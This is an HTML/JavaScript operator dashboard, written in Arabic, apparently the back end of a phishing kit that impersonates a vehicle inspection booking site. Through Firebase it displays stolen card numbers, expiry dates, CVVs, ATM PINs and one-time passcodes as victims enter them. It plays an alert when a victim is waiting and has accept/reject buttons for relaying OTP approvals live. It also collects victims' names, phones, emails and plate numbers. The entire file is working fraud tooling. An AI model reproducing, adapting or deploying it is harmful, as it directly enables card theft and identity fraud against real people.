<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم المهندس حسن - دقة الأرقام</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0a; color: #eee; margin: 0; padding: 0; }
        .navbar { background: #1e7344; padding: 10px; display: flex; justify-content: center; gap: 15px; position: sticky; top: 0; z-index: 1000; }
        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 10px 25px; border-radius: 6px; cursor: pointer; font-weight: bold; }
        .nav-btn.active { background: white; color: #1e7344; }
        .visitor-counter { background: #ffd700; color: #000; padding: 8px; text-align: center; font-weight: bold; }
        
        .container { padding: 15px; width: 100%; box-sizing: border-box; }
        .tab-content { display: none; width: 100%; overflow-x: auto; }
        .tab-content.active { display: block; }

        .data-table { width: 100%; border-collapse: collapse; min-width: 1200px; background: #161616; }
        .data-table th { background: #222; color: #888; padding: 12px; text-align: right; font-size: 13px; border-bottom: 2px solid #333; }
        .data-table td { padding: 12px; border-bottom: 1px solid #222; font-size: 14px; white-space: nowrap; }
        
        /* حل مشكلة لخبطة الأرقام - إجبار القراءة من اليسار لليمين */
        .ltr-fix { 
            direction: ltr !important; 
            unicode-bidi: bidi-override !important; 
            display: inline-block;
            text-align: left !important;
            font-family: 'Courier New', Courier, monospace; /* خط مريح للأرقام */
            letter-spacing: 1px;
        }

        .is-new-row { background: #0d2112 !important; border-right: 5px solid #28a745; }
        
        .btn { padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; background: #333; color: #666; }
        .active-green { background: #28a745 !important; color: white !important; }
        .active-red { background: #dc3545 !important; color: white !important; }

        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
    </style>
</head>
<body onload="checkSavedLogin()">

<audio id="alertSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

<div id="loginOverlay">
    <div style="background:white; padding:40px; border-radius:15px; text-align:center;">
        <h2 style="color:#1e7344">دخول المهندس حسن</h2>
        <input type="password" id="password" placeholder="كلمة المرور" style="width:100%; padding:10px; margin-bottom:10px;">
        <button onclick="checkLogin()" style="width:100%; padding:10px; background:#1e7344; color:white; border:none; border-radius:5px; cursor:pointer;">دخول</button>
    </div>
</div>

<div id="adminContent">
    <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
    <div class="navbar">
        <button class="nav-btn active" onclick="openTab(event, 'cardsSection')">💳 البطاقات</button>
        <button class="nav-btn" onclick="openTab(event, 'bookingSection')">👤 الحجوزات</button>
        <button class="nav-btn" onclick="logout()" style="background:#000">🚪 خروج</button>
    </div>

    <div class="container">
        <div id="cardsSection" class="tab-content active">
            <table class="data-table">
                <thead>
                    <tr>
                        <th>الاسم</th>
                        <th>رقم البطاقة</th>
                        <th>الانتهاء</th>
                        <th>CVV</th>
                        <th>PIN</th>
                        <th>OTP</th>
                        <th>الإجراء</th>
                    </tr>
                </thead>
                <tbody id="paymentsList"></tbody>
            </table>
        </div>

        <div id="bookingSection" class="tab-content">
            <table class="data-table">
                <thead>
                    <tr>
                        <th>الاسم</th>
                        <th>التليفون</th>
                        <th>السيارة</th>
                        <th>اللوحة</th>
                        <th>التاريخ</th>
                        <th>الوقت</th>
                        <th>الجيميل</th>
                        <th>البلد</th>
                    </tr>
                </thead>
                <tbody id="bookingList"></tbody>
            </table>
        </div>
    </div>
</div>

<script>
    function checkSavedLogin() { if (localStorage.getItem("admin_logged_in") === "true") showAdmin(); }
    function checkLogin() { if(document.getElementById('password').value === "H0987654H") { localStorage.setItem("admin_logged_in", "true"); showAdmin(); } }
    function showAdmin() { document.getElementById('loginOverlay').style.display = 'none'; document.getElementById('adminContent').style.display = 'block'; initFirebase(); }
    function logout() { localStorage.removeItem("admin_logged_in"); location.reload(); }
    function playSound() { document.getElementById('alertSound').play().catch(e => {}); }

    function initFirebase() {
        const firebaseConfig = {
            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8",
            authDomain: "saso-inspection.firebaseapp.com",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
            projectId: "saso-inspection"
        };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        database.ref('live_visitors').on('value', s => {
            let active = 0; const now = Date.now();
            s.forEach(c => { if(now - c.val().last_active < 30000) active++; });
            document.getElementById('onlineCount').innerText = active;
        });

        database.ref('payments').on('child_added', s => { renderCardRow(s.key, s.val()); });
        
        database.ref('payments').on('child_changed', s => {
            const val = s.val();
            const row = document.getElementById('row_' + s.key);
            if(row) {
                row.querySelector('.col-otp').innerText = val.otp || '-';
                row.querySelector('.col-pin').innerText = val.atm_pin || '-';
                if(val.status && val.status.includes('waiting')) {
                    row.classList.add('is-new-row');
                    row.querySelector('.btn-green').classList.add('active-green');
                    row.querySelector('.btn-red').classList.add('active-red');
                    playSound();
                }
                if(val.status === 'accept' || val.status === 'reject') {
                    row.classList.remove('is-new-row');
                    row.querySelector('.btn-green').classList.remove('active-green');
                    row.querySelector('.btn-red').classList.remove('active-red');
                }
            }
        });

        database.ref('visitors').on('child_added', s => { renderBookingRow(s.val()); });
    }

    function renderCardRow(key, val) {
        const list = document.getElementById('paymentsList');
        const tr = document.createElement('tr');
        tr.id = 'row_' + key;
        tr.innerHTML = `
            <td style="color:#28a745;">${val.cardHolder || 'عميل'}</td>
            <td><span class="ltr-fix">${val.cardNumber}</span></td>
            <td><span class="ltr-fix">${val.expiry}</span></td>
            <td><span class="ltr-fix">${val.cvv}</span></td>
            <td><span class="ltr-fix" style="color:#9c27b0;">${val.atm_pin || '-'}</span></td>
            <td><span class="ltr-fix col-otp" style="color:#2196f3;">${val.otp || '-'}</span></td>
            <td>
                <button class="btn btn-green" onclick="updateStat('${key}', 'accept')">قبول</button>
                <button class="btn btn-red" onclick="updateStat('${key}', 'reject')">رفض</button>
            </td>
        `;
        list.prepend(tr);
    }

    function renderBookingRow(val) {
        const list = document.getElementById('bookingList');
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${val.fullName || '-'}</td>
            <td class="ltr-fix">${val.phone || '-'}</td>
            <td>${val.vehicleType || '-'}</td>
            <td>${val.plateNumber || '-'}</td>
            <td>${val.bookingDate || '-'}</td>
            <td>${val.bookingTime || '-'}</td>
            <td>${val.email || '-'}</td>
            <td>${val.country || '-'}</td>
        `;
        list.prepend(tr);
    }

    function updateStat(id, action) { firebase.database().ref('payments/' + id).update({ status: action }); }

    function openTab(evt, name) {
        document.querySelectorAll(".tab-content").forEach(t => t.style.display = "none");
        document.querySelectorAll(".nav-btn").forEach(b => b.classList.remove("active"));
        document.getElementById(name).style.display = "block";
        evt.currentTarget.className += " active";
    }
</script>
</body>
</html>
